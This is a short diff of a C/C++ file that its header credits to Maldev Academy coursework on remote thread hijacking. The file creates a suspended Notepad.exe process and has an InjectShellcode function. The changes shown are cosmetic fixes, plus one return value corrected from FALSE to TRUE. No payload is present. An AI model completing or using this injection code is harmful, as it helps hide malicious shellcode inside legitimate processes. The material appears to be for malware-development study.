@@ -7,21 +7,26 @@
  * Notes : Maldev academy => Remote thread hijacking.
  */
 
-#include "hijack.hpp"
+#include "hijack.h"
 
 #pragma warning (disable:4996)
 
 #define TARGET_PROCESS "Notepad.exe"
 
 /**
- * Create a process in suspended mode.
+ * Create a process in SUSPENDED mode.
+ * 
+ * @param lpProcessName => nameof process to run.
+ * @param hProcess => PHANDLE to new created process
+ * @param hThread => PHANDLE to new main Thread of created process
+ * @param dwProcessId => process id of new created process.
  */
 BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT PHANDLE hProcess, OUT PHANDLE hThread){
     CHAR lpPath [MAX_PATH * 2];
     CHAR WinDr  [MAX_PATH];
 
     STARTUPINFOA			    Si = { 0 };
-	PROCESS_INFORMATION		Pi = { 0 };
+	PROCESS_INFORMATION		    Pi = { 0 };
 
 	// Cleaning the structs by setting the member values to 0
 	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
@@ -86,7 +91,7 @@ BOOL InjectShellcode(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSi
         return FALSE;
     }
 
-    return FALSE;
+    return TRUE;
 }
 
 /**
